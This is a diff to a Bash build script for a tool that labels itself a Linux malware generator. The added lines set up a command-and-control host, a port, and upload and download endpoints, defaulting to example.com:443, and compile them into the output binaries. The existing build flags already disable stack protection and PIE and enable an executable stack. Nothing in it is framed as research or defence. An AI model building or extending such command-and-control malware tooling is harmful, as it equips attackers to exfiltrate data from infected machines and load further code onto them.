@@ -5,7 +5,17 @@ set -e
 PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 OUTPUT_DIR="$PROJECT_ROOT/output/linux"
 
+C2_HOST="${C2_HOST:-example.com}"
+C2_PORT="${C2_PORT:-443}"
+UPLOAD_ENDPOINT="${UPLOAD_ENDPOINT:-/api/upload}"
+DOWNLOAD_ENDPOINT="${DOWNLOAD_ENDPOINT:-/api/download}"
+
 echo "=== Malw Generator - Linux ==="
+echo ""
+echo "[*] C2 Host: $C2_HOST"
+echo "[*] C2 Port: $C2_PORT"
+echo "[*] Upload Endpoint: $UPLOAD_ENDPOINT"
+echo "[*] Download Endpoint: $DOWNLOAD_ENDPOINT"
 echo ""
 
 if ! command -v gcc &> /dev/null; then
@@ -28,6 +38,8 @@ echo ""
 mkdir -p "$OUTPUT_DIR"
 
 CFLAGS="-O2 -fno-stack-protector -no-pie -z execstack -I$PROJECT_ROOT"
+CFLAGS="$CFLAGS -DC2_HOST=\"$C2_HOST\" -DC2_PORT=$C2_PORT"
+CFLAGS="$CFLAGS -DUPLOAD_ENDPOINT=\"$UPLOAD_ENDPOINT\" -DDOWNLOAD_ENDPOINT=\"$DOWNLOAD_ENDPOINT\""
 LDFLAGS="-pthread"
 
 echo "--- Compiling ---"
